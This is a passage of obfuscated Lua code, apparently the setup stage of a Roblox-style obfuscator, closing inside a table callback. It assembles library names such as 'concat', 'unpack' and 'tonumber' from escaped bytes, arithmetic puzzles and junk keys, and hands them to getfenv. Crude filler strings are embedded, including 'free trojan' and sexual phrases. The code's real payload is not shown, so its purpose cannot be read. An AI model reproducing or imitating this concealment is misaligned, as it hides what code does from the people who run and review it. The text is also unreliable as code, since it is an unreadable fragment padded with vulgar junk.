gang]]+(0xe7/3))-0x38)==(96-0x5b))..'\116\101',["ض؃كحڝڝدجئجؠضڪئڪضس"]='\99'..(function(e)return(e and'ززئآقنقجح')and'\90\19\157'or'\104\97'end)((0x6e/22)==(684/0xe4))..'\114',[((-25908/0xcc)+663)]='\116\97'..(function(e)return(e and'آح؃جټڪ؃آنحجك')and'\64\113'or'\98\108'end)((0x54-78)==(0x4b0/240))..'\101',["ڪقحجڪدؠڝ"]=(function(e)return(e and'ڪټجآڪئدقجڪس؃')or'\115\117'or'\78\107'end)((30-0x1b)==(0x84+-101))..'\98',["زدآز؃ڪضكؠؠقڪضدس"]='\99\111'..(function(e)return(e and'سج؃حح؃حڝؠضڝؠجټضدؠس')and'\110\99'or'\110\105\103\97'end)((-69+0x64)==((0x7a-72)+-#"I like gargling cum"))..'\97\116',[(-#'test'+(0x2a3+-58))]=(function(e,o)return(e and'دكڪجټد؃ټؠآآآڝس')and'\48\159\158\188\10'or'\109\97'end)(((-93+0x6b)+-#"no thanks")==((66+-0x35)+-#'test123'))..'\116\104',[(-#"test"+(0xac2-1418))]=(function(e,o)return((-#"me big peepee"+(0x252/33))==(69-0x42)and'\48'..'\195'or e..((not'\20\95\69'and'\90'..'\180'or o)))or'\199\203\95'end),["ڝټجزآڝحكجئ"]='\105\110'..(function(e,o)return(e and'ټك؃ؠقكټضنټ')and'\90\115\138\115\15'or'\115\101'end)((-117+0x7a)==(0xae-143))..'\114\116',["ؠټڪزقڝڪحؠؠټضئڝكټقض"]='\117\110'..(function(e,o)return(e and'سضآزضجټؠسڪضؠڝڝ')or'\112\97'or'\20\38\154'end)((-104+0x6d)==(5022/(-#"free trojan"+(402-0xe5))))..'\99\107',["ڝزقئڪڝزڝجقكسض"]='\115\101'..(function(e)return(e and'آدزدټحسض')and'\110\112\99\104'or'\108\101'end)(((-0x7f+151)+-#"I like gargling cum")==((-0x23+181)-0x73))..'\99\116',["ققجض؃زدجآن"]='\116\111\110'..(function(e,o)return(e and'زضسزنجضئدسسدئضجآټټح')and'\117\109\98'or'\100\97\120\122'end)((0x62-93)==(0x22-29))..'\101\114'},{["ټكحآزټحضنزسك"]=((getfenv))},((getfenv))()) end)()
  	end    
})
